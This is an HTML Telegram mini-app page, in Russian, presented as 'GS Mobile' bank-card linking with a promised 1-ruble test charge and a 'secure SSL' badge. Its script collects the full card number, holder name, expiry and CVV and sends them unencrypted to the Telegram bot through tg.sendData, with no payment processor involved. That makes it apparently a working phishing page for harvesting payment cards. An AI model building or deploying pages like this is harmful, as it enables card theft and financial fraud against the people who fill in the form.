<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Привязка карты - GS Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #888;
            font-size: 14px;
        }
        
        .card-preview {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            color: white;
            position: relative;
            height: 200px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        
        .chip {
            width: 50px;
            height: 35px;
            background: linear-gradient(135deg, #f0d878 0%, #d4af37 100%);
            border-radius: 8px;
            position: relative;
        }
        
        .chip::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 30px;
            height: 2px;
            background: rgba(0,0,0,0.3);
        }
        
        .chip::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(90deg);
            width: 30px;
            height: 2px;
            background: rgba(0,0,0,0.3);
        }
        
        .card-number-display {
            font-size: 22px;
            letter-spacing: 3px;
            font-family: 'Courier New', monospace;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .card-info {
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }
        
        .card-holder {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .card-expiry {
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #667eea;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .submit-btn:active {
            transform: translateY(0);
        }
        
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }
        
        .secure-badge svg {
            width: 16px;
            height: 16px;
            margin-right: 8px;
            fill: #4caf50;
        }
        
        .info-text {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .amount-badge {
            display: inline-block;
            background: #e8f5e9;
            color: #4caf50;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: 600;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>GS Mobile</h1>
            <p>Привязка банковской карты</p>
        </div>
        
        <div class="info-text">
            С баланса будет списано <span class="amount-badge">1 ₽</span><br>
            Сумма вернётся на карту в течение нескольких минут
        </div>
        
        <div class="card-preview">
            <div class="chip"></div>
            <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
            <div class="card-info">
                <div class="card-holder" id="holderDisplay">ИМЯ ФАМИЛИЯ</div>
                <div class="card-expiry" id="expiryDisplay">MM/YY</div>
            </div>
        </div>
        
        <form id="cardForm">
            <div class="form-group">
                <label for="cardNumber">Номер карты</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
            </div>
            
            <div class="form-group">
                <label for="cardHolder">Держатель карты</label>
                <input type="text" id="cardHolder" placeholder="IVANOV IVAN" maxlength="26">
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry">Срок действия</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
                </div>
                <div class="form-group">
                    <label for="cvv">CVV/CVC</label>
                    <input type="password" id="cvv" placeholder="123" maxlength="3">
                </div>
            </div>
            
            <button type="submit" class="submit-btn">Привязать карту</button>
        </form>
        
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            Безопасное соединение SSL
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        // Устанавливаем цвет шапки
        tg.setHeaderColor('#667eea');
        tg.setBackgroundColor('#667eea');
        
        const cardNumber = document.getElementById('cardNumber');
        const cardHolder = document.getElementById('cardHolder');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const cardDisplay = document.getElementById('cardDisplay');
        const holderDisplay = document.getElementById('holderDisplay');
        const expiryDisplay = document.getElementById('expiryDisplay');
        
        // Форматирование номера карты
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            e.target.value = formatted;
            cardDisplay.textContent = formatted || '•••• •••• •••• ••••';
        });
        
        // Форматирование срока действия
        expiry.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
            expiryDisplay.textContent = value || 'MM/YY';
        });
        
        // Имя держателя
        cardHolder.addEventListener('input', (e) => {
            let value = e.target.value.toUpperCase();
            e.target.value = value.replace(/[^A-Z\s]/g, '');
            holderDisplay.textContent = value || 'ИМЯ ФАМИЛИЯ';
        });
        
        // Только цифры для CVV
        cvv.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        // Отправка формы
        document.getElementById('cardForm').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const cardData = {
                card_number: cardNumber.value.replace(/\s/g, ''),
                card_holder: cardHolder.value,
                expiry: expiry.value,
                cvv: cvv.value
            };
            
            // Отправляем данные в бот
            tg.sendData(JSON.stringify(cardData));
            tg.close();
        });
    </script>
</body>
</html>
